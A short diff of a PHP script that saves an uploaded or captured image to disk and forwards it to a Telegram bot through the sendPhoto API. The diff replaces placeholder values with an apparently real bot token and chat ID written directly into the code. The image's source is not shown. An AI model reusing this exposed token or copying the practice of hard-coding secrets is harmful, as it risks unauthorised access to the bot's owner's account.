@@ -11,8 +11,8 @@ if ($image) {
     file_put_contents($fileName, $fileData);
 
     // Send to Telegram
-    $telegramToken = "YOUR_BOT_TOKEN";
-    $chatID = "YOUR_CHAT_ID";
+    $telegramToken = "Y7593653128:AAGTeaMtzMzjcPbfABOTZ0YlQdfEGxkvHFQ";
+    $chatID = "7615485308";
     $url = "https://api.telegram.org/bot$telegramToken/sendPhoto";
 
     $postData = [
